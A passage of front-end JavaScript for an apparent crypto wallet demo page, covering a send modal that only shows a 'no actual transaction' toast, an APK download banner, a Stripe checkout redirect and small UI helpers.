    const addr = (recipientInput.value || '').trim();
    const amount = parseAmount(amountInput.value);
    const maxAmount = currentSendAsset === 'USDT' ? currentSendBalance : 999999999;
    if (!isValidAddress(addr, currentSendNetwork) || amount <= 0 || amount > maxAmount) return;
    closeModal();
    showToast(`Sending ${amount.toLocaleString()} ${currentSendAsset} (Demo – no actual transaction)`);
  }

  [sendBtn, navSendBtn].forEach(btn => {
    if (btn) btn.addEventListener('click', (e) => { e.preventDefault(); openModal(); });
  });

  document.getElementById('receive-btn')?.addEventListener('click', (e) => {
    e.preventDefault();
    sendModal.classList.remove('active');
    document.body.style.overflow = '';
    openUsdtPopup();
  });
  [closeBtn, cancelBtn].forEach(btn => {
    if (btn) btn.addEventListener('click', closeModal);
  });

  if (recipientInput) recipientInput.addEventListener('input', validateAndUpdate);
  if (amountInput) amountInput.addEventListener('input', validateAndUpdate);

  if (maxBtn) {
    maxBtn.addEventListener('click', () => {
      const max = currentSendAsset === 'USDT' ? currentSendBalance : 999999999;
      amountInput.value = max.toLocaleString();
      validateAndUpdate();
    });
  }

  if (confirmBtn) confirmBtn.addEventListener('click', onConfirm);

  sendModal?.addEventListener('click', (e) => {
    if (e.target === sendModal) closeModal();
  });

  document.addEventListener('keydown', (e) => {
    if (e.key === 'Escape' && sendModal?.classList.contains('active')) closeModal();
  });
}

// APK download banner
function initApkBanner() {
  const banner = document.getElementById('apk-banner');
  const closeBtn = document.getElementById('apk-banner-close');
  const downloadBtn = document.getElementById('apk-download-btn');
  const dismissed = localStorage.getItem('apk-banner-dismissed');
  if (dismissed === 'true') banner?.classList.add('hidden');
  closeBtn?.addEventListener('click', () => {
    banner?.classList.add('hidden');
    localStorage.setItem('apk-banner-dismissed', 'true');
  });
  downloadBtn?.addEventListener('click', (e) => {
    e.preventDefault();
    window.open(APK_DOWNLOAD_URL, '_blank');
  });
}

// Purchase - redirect to Stripe Checkout
function initPurchase() {
  document.getElementById('purchase-btn')?.addEventListener('click', (e) => {
    e.preventDefault();
    if (STRIPE_PAYMENT_LINK && STRIPE_PAYMENT_LINK !== 'https://buy.stripe.com/') {
      window.location.href = STRIPE_PAYMENT_LINK;
    } else {
      showToast('Configure STRIPE_PAYMENT_LINK in app.js - create a Payment Link at dashboard.stripe.com', 'error');
    }
  });
}

// Smooth scroll
function initSmoothScroll() {
  document.querySelectorAll('a[href^="#"]').forEach(anchor => {
    anchor.addEventListener('click', function(e) {
      e.preventDefault();
      const target = document.querySelector(this.getAttribute('href'));
      if (target) target.scrollIntoView({ behavior: 'smooth' });
    });
  });
}

// Toast
function showToast(message, type = 'success') {
  const existing = document.querySelector('.toast');
  if (existing) existing.remove();

  const toast = document.createElement('div');
  toast.className = `toast toast-${type}`;
  toast.innerHTML = `<span>${message}</span>`;
  toast.style.cssText = `
    position: fixed; bottom: 100px; left: 50%; transform: translateX(-50%);
    background: #1E293B; color: white; padding: 12px 20px; border-radius: 12px;
    font-size: 0.9rem; font-weight: 500; box-shadow: 0 10px 25px rgba(0,0,0,0.2);
    z-index: 9999; animation: toastIn 0.3s ease;
  `;
  const style = document.createElement('style');
  style.textContent = `@keyframes toastIn { from { opacity: 0; transform: translateX(-50%) translateY(10px); } to { opacity: 1; transform: translateX(-50%) translateY(0); } }`;
  document.head.appendChild(style);
  document.body.appendChild(toast);
  setTimeout(() => toast.remove(), 3000);
}
